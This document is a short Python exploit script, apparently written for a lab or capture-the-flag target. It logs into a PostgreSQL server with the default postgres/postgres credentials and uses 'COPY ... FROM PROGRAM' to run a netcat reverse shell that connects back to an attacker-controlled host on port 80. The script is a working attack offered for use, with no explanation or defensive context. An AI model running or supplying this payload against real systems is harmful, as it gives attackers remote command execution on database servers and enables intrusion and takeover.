#!/usr/bin/env python3
import psycopg2
import random
import string

random_suffix = ''.join(random.choices(string.ascii_lowercase, k=3))
table = f"cmd_exec_{random_suffix}"

RHOST = '192.168.56.47'
RPORT = 5437
LHOST = '192.168.49.56'
LPORT = 80
USER = 'postgres'
PASSWD = 'postgres'

with psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASSWD) as conn:
    try:
        cur = conn.cursor()
        print("[!] Connected to the PostgreSQL database")
        rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
        print(f"[*] Executing the payload. Please check if you got a reverse shell!\n")
        cur.execute(f'DROP TABLE IF EXISTS {table}')
        cur.execute(f'CREATE TABLE {table}(cmd_output text)')
        cur.execute(f'COPY {table} FROM PROGRAM \'{rev_shell}\'')
        cur.execute(f'SELECT * from {table}')
        v = cur.fetchone()
        # print(v)
        cur.close()

    except Exception as e:
        print(f"[!] Something went wrong: {e}")
